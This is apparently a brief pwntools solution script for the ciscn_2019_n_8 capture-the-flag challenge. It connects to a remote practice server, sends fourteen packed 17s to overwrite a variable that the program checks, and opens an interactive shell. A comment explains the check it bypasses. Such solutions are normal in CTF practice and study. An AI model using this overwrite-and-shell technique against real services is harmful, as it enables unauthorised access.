from pwn import *
context.arch='i386'

# p = process('./ciscn_2019_n_8')
p = remote('node3.buuoj.cn',26085)

p.sendlineafter("What's your name?\n",p32(17)*14)
'''
pass the judgement:
	...
  if ( *(_QWORD *)&var[13] )
  {
    if ( *(_QWORD *)&var[13] == 17LL ))
    ...
   at the beginning of the program, var[14] and var[13] was set to zero,
   and from the assembly code we know the first judgement is compare var[13] adn var[14],
   so when we padding, the value of var[14] can't be covered
'''
sleep(1)
p.interactive()
